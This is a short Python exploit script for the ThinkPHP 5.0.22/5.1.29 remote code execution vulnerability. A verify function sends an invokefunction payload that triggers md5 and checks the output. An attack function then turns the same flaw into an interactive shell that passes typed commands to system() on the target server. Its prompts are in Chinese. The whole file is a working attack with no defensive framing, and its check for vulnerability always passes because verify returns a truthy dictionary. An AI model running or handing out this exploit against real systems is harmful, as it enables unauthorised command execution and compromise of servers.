import requests
import re
import urllib

def verify(url):
    relsult = {
        'name': 'Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability',
        'vulnerable': False,
        'attack': True,
    }
    try:
        payload = urllib.parse.urljoin(url, r'''/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1''')
        response = requests.get(payload, timeout=3, verify=False)
        if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = payload
            relsult['attack'] = True
        return relsult
    except:
        return relsult

# getshell
def attack(url):
    basic_payload = url + r'''/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]='''
    if verify(url):
        print('[+] 存在 Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability')
        print('[+] 开始执行命令, 输入exit推出')
        cmd_shell = ''
        while cmd_shell != 'exit':
            cmd_shell = str(input('[+] 执行命令:'))
            payload = basic_payload + cmd_shell
            response = requests.get(payload, verify=False, timeout=3)
            print('[*] 执行结果:\n', response.text)
        return True
    else:
        return False
